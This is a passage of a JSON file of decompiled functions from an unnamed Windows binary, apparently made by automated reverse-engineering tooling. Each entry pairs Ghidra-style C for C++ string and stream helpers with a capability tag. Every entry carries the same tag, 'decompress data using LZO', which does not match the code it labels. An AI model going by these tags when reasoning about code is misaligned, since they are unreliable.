& 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0048a3b3;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0xc))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x0048a2e7:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1050
    },
    "0048b0c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0048b0c0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.004898e0();\n    if (var_20h == '\\0') goto code_r0x0048a8c4;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x0048a993:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.004899a0();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0048a993;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.004512b0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x451560) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x18))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.004bbce0();\n        }\n    }\ncode_r0x0048a8c4:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.004bdfd0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1077
    },
    "0048b460": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048b460(void)\n\n{\n    fcn.0048c930(0);\n    return;\n}\n",
        "token_count": 27
    },
    "0048b7a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0048b7a0(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    \n    if (0x3ffffffc < param_1) {\n        fcn.004be310(0x5239ad);\n        iVar2 = *extraout_ECX;\n        iVar1 = *(iVar2 + -0xc);\n        if (-1 < *(iVar2 + -4)) {\n            fcn.0048b100();\n            iVar2 = *extraout_ECX;\n        }\n        return iVar2 + iVar1 + -1;\n    }\n    if (param_2 < param_1) {\n        if (param_1 < param_2 * 2) {\n            param_1 = param_2 * 2;\n        }\n        if (((0x1000 < param_1 + 0x1d) && (param_2 < param_1)) &&\n           (param_1 = (param_1 + 0x1000) - (param_1 + 0x1d & 0xfff),  0x3ffffffc < param_1)) {\n            param_1 = 0x3ffffffc;\n        }\n    }\n    iVar2 = fcn.004c2c70(param_1 + 0xd);\n    *(iVar2 + 4) = param_1;\n    *(iVar2 + 8) = 0;\n    return iVar2;\n}\n",
        "token_count": 333
    },
    "0048ba60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048ba60(int32_t *param_1, uchar *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t *extraout_ECX;\n    uint32_t uVar6;\n    int32_t *in_stack_ffffffd8;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    puVar4 = *param_1;\n    if (0x3ffffffcU - *(puVar4 + -0xc) < param_3) {\n        fcn.004be310(0x523a36);\n        iVar2 = *(*in_stack_ffffffd8 + -0xc);\n        if (iVar2 != 0) {\n            iVar3 = *extraout_ECX;\n            uVar6 = *(iVar3 + -0xc) + iVar2;\n            if ((uVar6 < *(iVar3 + -8) || uVar6 == *(iVar3 + -8)) && (*(iVar3 + -4) < 1)) {\n                puVar4 = *in_stack_ffffffd8;\n                puVar5 = *extraout_ECX + *(*extraout_ECX + -0xc);\n            }\n            else {\n                fcn.0048c930(uVar6);\n                puVar4 = *in_stack_ffffffd8;\n                puVar5 = *extraout_ECX + *(*extraout_ECX + -0xc);\n            }\n            if (iVar2 == 1) {\n                *puVar5 = *puVar4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar5, puVar4, iVar2);\n            }\n            iVar2 = *extraout_ECX;\n            *(iVar2 + -4) = 0;\n            *(iVar2 + -0xc) = uVar6;\n            *(iVar2 + uVar6) = 0;\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    uVar6 = *(puVar4 + -0xc) + param_3;\n    if ((*(puVar4 + -8) <= uVar6 && uVar6 != *(puVar4 + -8)) || (piVar1 = puVar4 + -4,  puVar4 = *param_1,  0 < *piVar1)\n       ) {\n        if ((puVar4 <= param_2) && (param_2 <= puVar4 + *(puVar4 + -0xc))) {\n            fcn.0048c930(uVar6);\n            iVar2 = *param_1;\n            param_2 = param_2 + (iVar2 - puVar4);\n            puVar4 = iVar2 + *(iVar2 + -0xc);\n            goto joined_r0x0048baf9;\n        }\n        fcn.0048c930(uVar6);\n        puVar4 = *param_1;\n    }\n    puVar4 = puVar4 + *(puVar4 + -0xc);\njoined_r0x0048baf9:\n    if (param_3 == 1) {\n        *puVar4 = *param_2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar4, param_2, param_3);\n    }\n    iVar2 = *param_1;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar6;\n    *(iVar2 + uVar6) = 0;\n    return param_1;\n}\n",
        "token_count": 803
    },
    "0048bb20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0048bb20(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(*param_2 + -0xc);\n    if (iVar1 != 0) {\n        iVar2 = *param_1;\n        uVar5 = *(iVar2 + -0xc) + iVar1;\n        if ((uVar5 < *(iVar2 + -8) || uVar5 == *(iVar2 + -8)) && (*(iVar2 + -4) < 1)) {\n            puVar3 = *param_2;\n            puVar4 = *param_1 + *(*param_1 + -0xc);\n        }\n        else {\n            fcn.0048c930(uVar5);\n            puVar3 = *param_2;\n            puVar4 = *param_1 + *(*param_1 + -0xc);\n        }\n        if (iVar1 == 1) {\n            *puVar4 = *puVar3;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar1);\n        }\n        iVar1 = *param_1;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar5;\n        *(iVar1 + uVar5) = 0;\n        return param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 344
    },
    "0048bcb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0048bcb0(int32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t extraout_ECX;\n    uint32_t uVar4;\n    uint in_stack_ffffffd8;\n    \n    iVar1 = *param_1;\n    iVar2 = *(iVar1 + -0xc);\n    if (param_2 <= 0x3ffffffcU - iVar2) {\n        uVar4 = iVar2 + param_2;\n        if ((uVar4 < *(iVar1 + -8) || uVar4 == *(iVar1 + -8)) && (*(iVar1 + -4) < 1)) {\n            pcVar3 = *param_1 + *(*param_1 + -0xc);\n        }\n        else {\n            fcn.0048c930(uVar4);\n            pcVar3 = *param_1 + *(*param_1 + -0xc);\n        }\n        if (param_2 == 1) {\n            *pcVar3 = param_3;\n        }\n        else {\n            sub.msvcrt.dll_memset(pcVar3, param_3, param_2);\n        }\n        iVar1 = *param_1;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar4;\n        *(iVar1 + uVar4) = 0;\n        return iVar1;\n    }\n    fcn.004be310(0x523a36);\n    fcn.0048b880(in_stack_ffffffd8, iVar2);\n    return extraout_ECX;\n}\n",
        "token_count": 375
    },
    "0048cc10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048cc10(int32_t *param_1, uchar param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *param_1;\n    iVar3 = *(iVar2 + -0xc);\n    uVar1 = iVar3 + 1;\n    if ((*(iVar2 + -8) <= uVar1 && uVar1 != *(iVar2 + -8)) || (0 < *(iVar2 + -4))) {\n        fcn.0048c930(uVar1);\n    }\n    *(*param_1 + *(*param_1 + -0xc)) = param_2;\n    iVar2 = *param_1;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar1;\n    *(iVar2 + 1 + iVar3) = 0;\n    return;\n}\n",
        "token_count": 207
    },
    "0048ea80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0048ea80(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x52bf98;\n    in_ECX[1] = arg_ch != 0;\n    in_ECX[2] = arg_8h;\n    uVar1 = fcn.004ae930();\n    in_ECX[4] = uVar1;\n    fcn.0048e740(0);\n    return;\n}\n",
        "token_count": 140
    },
    "0048f1c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0048f1c0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x52bfa8;\n    in_ECX[1] = arg_ch != 0;\n    in_ECX[2] = arg_8h;\n    uVar1 = fcn.004ae930();\n    in_ECX[4] = uVar1;\n    fcn.0048ee80(0);\n    return;\n}\n",
        "token_count": 143
    },
    "0048f690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0048f690(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x52bfb8;\n    fcn.0048cd70(arg_8h);\n    return;\n}\n",
        "token_count": 80
    },
    "0048f6f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048f6f0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar auStack13 [9];\n    \n    iVar3 = *0x515a34;\n    *param_1 = 0x52bfb8;\n    iVar2 = param_1[1];\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 + -4);\n        *(iVar2 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar2 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        fcn.004bca60();\n        return;\n    }\n    fcn.0048b610(auStack13);\n    fcn.004bca60();\n    return;\n}\n",
        "token_count": 216
    },
    "0048f780": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048f780(uint *param_1, uint param_2)\n\n{\n    fcn.004a0d00(param_2);\n    *param_1 = 0x52bfcc;\n    return;\n}\n",
        "token_count": 54
    },
    "00490b90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00490b90(uint *param_1, uint param_2)\n\n{\n    fcn.0048f5f0(param_2);\n    *param_1 = 0x52c050;\n    return;\n}\n",
        "token_count": 55
    },
    "00490c50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00490c50(uint *param_1, uint param_2)\n\n{\n    fcn.0048f5f0(param_2);\n    *param_1 = 0x52c064;\n    return;\n}\n",
        "token_count": 55
    },
    "00490d10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00490d10(uint *param_1, uint param_2)\n\n{\n    fcn.0048f5f0(param_2);\n    *param_1 = 0x52c078;\n    return;\n}\n",
        "token_count": 55
    },
    "00491440": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00491440(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        *NULL = fcn.0048b140(0, 0, &var_1dh);\n        uVar3 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_1dh + 1);\n        if (*arg_28h == 0) {\n            if (*(arg_30h + 0x18) != NULL) {\n                (**(arg_30h + 0x18))(arg_30h);\n            }\n            fcn.0048cd70(&var_1dh + 1);\n            uVar2 = *(stack0xffffffe0 + -0xc);\n            *(arg_30h + 0x18) = 0x4936b0;\n            *(arg_30h + 4) = uVar2;\n        }\n        if (*0x515a34 == 0) {\n            iVar4 = *(stack0xffffffe0 + -4);\n            *(stack0xffffffe0 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = stack0xffffffe0 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.0048b610(&var_1dh);\n        }\n    }\n    else {\n        uVar3 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 558
    },
    "00491700": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00491700(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        *NULL = fcn.00483230(0, 0, &var_1dh);\n        uVar3 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_1dh + 1);\n        if (*arg_28h == 0) {\n            if (*(arg_30h + 0x18) != NULL) {\n                (**(arg_30h + 0x18))(arg_30h);\n            }\n            fcn.00485000(&var_1dh + 1);\n            uVar2 = *(stack0xffffffe0 + -0xc);\n            *(arg_30h + 0x18) = 0x493730;\n            *(arg_30h + 4) = uVar2;\n        }\n        if (*0x515a34 == 0) {\n            iVar4 = *(stack0xffffffe0 + -4);\n            *(stack0xffffffe0 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = stack0xffffffe0 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.00483750(&var_1dh);\n        }\n    }\n    else {\n        uVar3 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 567
    },
    "004919f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00491bbb)\n\nuint __cdecl\nfcn.004919f0(uint noname_0, int32_t *noname_1, uint noname_2, uint noname_3, uint32_t noname_4, uint noname_5, \n            uint noname_6, uint noname_7, uint noname_8, uint noname_9, int32_t noname_10, uint noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, \n            uint noname_24, uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, \n            uint noname_30, uint noname_31, uint noname_32, uint noname_33, uint noname_34, uint noname_35, \n            uint noname_36, uint noname_37, uint noname_38, uint noname_39, uint noname_40, uint noname_41, \n            uint noname_42, uint noname_43, uint noname_44, uint noname_45, uint noname_46, uint noname_47, \n            uint noname_48, uint noname_49, uint noname_50, uint noname_51, uint arg_ch, uint arg_10h, uint arg_14h, \n            uint arg_18h, uint arg_1ch, uint arg_20h, uint noname_58, uint noname_59, uint noname_60, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_1ch_3;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint32_t in_stack_fffffe70;\n    uchar *puStack352;\n    uchar auStack344 [8];\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack316;\n    uint uStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    uint32_t uStack300;\n    int32_t *piStack292;\n    uint uStack288;\n    uint uStack284;\n    uchar uStack280;\n    uint uStack276;\n    ushort uStack272;\n    ushort uStack268;\n    ulong uStack266;\n    int32_t *piStack256;\n    uchar uStack237;\n    int32_t iStack236;\n    uint uStack220;\n    int32_t iStack212;\n    uchar *puStack208;\n    int32_t *piStack196;\n    uint32_t uStack184;\n    int32_t iStack160;\n    uchar *puStack148;\n    uchar auStack140 [8];\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    uint32_t uStack96;\n    int32_t *piStack88;\n    uint32_t uStack76;\n    int32_t var_30h_4;\n    uint var_2ch_2;\n    uchar var_1dh_2;\n    int32_t var_1ch_4;\n    \n    if (noname_10 == 0) {\n        uStack96 = 0x491ac6;\n        uVar3 = (**(*noname_1 + 8))();\n        return uVar3;\n    }\n    iStack212 = *(noname_10 + 0x18);\n    if (iStack212 != 0) {\n        uStack96 = 0x491a35;\n        fcn.0048cd00();\n        puStack100 = noname_3;\n        iStack104 = noname_2;\n        uStack108 = 0x491a68;\n        uStack96 = noname_4 & 0xff;\n        uVar3 = (**(*noname_1 + 0xc))();\n        if (*0x515a34 == 0) {\n            iVar4 = *(var_1ch_4 + -4);\n            *(var_1ch_4 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_1ch_4 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack128 = &stack0xffffffdf;\n            uStack132 = 0x491af3;\n            fcn.0048b610();\n            return uVar3;\n        }\n        return uVar3;\n    }\n    uStack96 = 0x491b10;\n    uStack112 = fcn.004be210(0x52380c);\n    uStack96 = 0x491b23;\n    fcn.0048b630();\n    puStack100 = 0x491b2c;\n    uStack96 = uStack112;\n    fcn.0043a8e0();\n    uStack108 = noname_6;\n    iStack104 = iStack212;\n    if (var_30h_4 == 0) {\n        puStack208 = 0x491c16;\n        puStack100 = &stack0xfffffffc;\n        uVar3 = (**(*piStack88 + 8))();\n        return uVar3;\n    }\n    if (*(var_30h_4 + 0x18) != 0) {\n        puStack208 = 0x491b7b;\n        puStack100 = &stack0xfffffffc;\n        fcn.004b02f0();\n        uStack220 = 0x491bae;\n        puStack208 = uStack76 & 0xff;\n        uVar3 = (**(*piStack88 + 0xc))();\n        return uVar3;\n    }\n    puStack208 = 0x491c2d;\n    puStack100 = &stack0xfffffffc;\n    uStack220 = fcn.004be210(\"uninitialized __any_string\");\n    if (puStack148 != &stack0xffffff74) {\n        puStack208 = 0x491c41;\n        fcn.004c2c30();\n    }\n    puStack208 = 0x491c49;\n    fcn.0043a8e0();\n    if (iStack160 == 0) {\n        uStack300 = 0x491d24;\n        puStack208 = &stack0xffffff9c;\n        uVar3 = (**(*piStack196 + 8))();\n        return uVar3;\n    }\n    iStack308 = *(iStack160 + 0x18);\n    if (iStack308 == 0) {\n        uStack300 = 0x491d6f;\n        puStack208 = &stack0xffffff9c;\n        uStack316 = fcn.004be210(0x52380c);\n        uStack300 = 0x491d82;\n        fcn.00483770();\n        puStack304 = 0x491d8b;\n        uStack300 = uStack316;\n        fcn.0043a8e0();\n        if (piStack256 == NULL) {\n            puStack304 = &stack0xffffff30;\n            uVar3 = (**(*piStack292 + 8))\n                              (uStack288, uStack284, uStack280, uStack276, uStack272, CONCAT82(uStack266, uStack268));\n            return uVar3;\n        }\n        if (piStack256[6] != 0) {\n            puStack352 = &stack0xfffffea8;\n            puStack304 = &stack0xffffff30;\n            fcn.004b3070(*piStack256, *piStack256 + piStack256[1] * 2, in_stack_fffffe70 & 0xffffff00);\n            uVar3 = (**(*piStack292 + 0xc))(uStack288, uStack284, uStack280, uStack276, uStack272, &stack0xfffffea0);\n            if (puStack352 != &stack0xfffffea8) {\n                fcn.004c2c30(puStack352);\n            }\n            return uVar3;\n        }\n        puStack304 = &stack0xffffff30;\n        uVar3 = fcn.004be210(\"uninitialized __any_string\");\n        if (puStack352 != &stack0xfffffea8) {\n            fcn.004c2c30(puStack352);\n        }\n        fcn.0043a8e0(uVar3);\n        iVar4 = *0x515a34;\n        *extraout_ECX = 0x52b530;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x52cab0;\n        fcn.004aea30(extraout_ECX + 2);\n        fcn.004aea60();\n        uVar3 = fcn.004c2c30(extraout_ECX);\n        return uVar3;\n    }\n    uStack300 = 0x491c98;\n    puStack208 = &stack0xffffff9c;\n    fcn.00484f70();\n    uStack312 = 0x491cc6;\n    uStack300 = uStack184 & 0xff;\n    uVar3 = (**(*piStack196 + 0xc))();\n    if (*0x515a34 == 0) {\n        iVar4 = *(iStack236 + -4);\n        *(iStack236 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack236 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack332 = &stack0xffffff13;\n        uStack336 = 0x491d52;\n        fcn.00483750();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 2384
    },
    "00491c50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00491c50(uint param_1, int32_t *param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, \n                 uint param_7)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint32_t var_18h;\n    uint var_1ch_3;\n    uint var_20h_2;\n    int32_t var_30h_3;\n    uint32_t in_stack_ffffff3c;\n    uchar *var_30h_5;\n    uint var_2ch;\n    uchar auStack140 [8];\n    uchar auStack132 [3];\n    uchar *var_1dh_3;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    uint32_t uStack96;\n    int32_t *piStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar uStack76;\n    uint var_1ch_5;\n    ushort uStack68;\n    ushort uStack64;\n    ulong uStack62;\n    int32_t *piStack52;\n    uchar var_1dh_2;\n    int32_t var_1ch_4;\n    \n    if (var_30h_3 == 0) {\n        uStack96 = 0x491d24;\n        uVar3 = (**(*param_2 + 8))();\n        return uVar3;\n    }\n    iStack104 = *(var_30h_3 + 0x18);\n    if (iStack104 != 0) {\n        uStack96 = 0x491c98;\n        fcn.00484f70();\n        puStack100 = param_4;\n        iStack104 = param_3;\n        uStack108 = 0x491cc6;\n        uStack96 = var_18h & 0xff;\n        uVar3 = (**(*param_2 + 0xc))();\n        if (*0x515a34 == 0) {\n            iVar4 = *(var_1ch_4 + -4);\n            *(var_1ch_4 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_1ch_4 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (0 < iVar4) {\n            return uVar3;\n        }\n        unique0x00001d00 = &stack0xffffffdf;\n        _auStack132 = 0x491d52;\n        fcn.00483750();\n        return uVar3;\n    }\n    uStack96 = 0x491d6f;\n    uStack112 = fcn.004be210(0x52380c);\n    uStack96 = 0x491d82;\n    fcn.00483770();\n    puStack100 = 0x491d8b;\n    uStack96 = uStack112;\n    fcn.0043a8e0();\n    uStack108 = var_20h_2;\n    if (piStack52 == NULL) {\n        puStack100 = &stack0xfffffffc;\n        uVar3 = (**(*piStack88 + 8))(uStack84, uStack80, uStack76, var_1ch_5, uStack68, CONCAT82(uStack62, uStack64));\n        return uVar3;\n    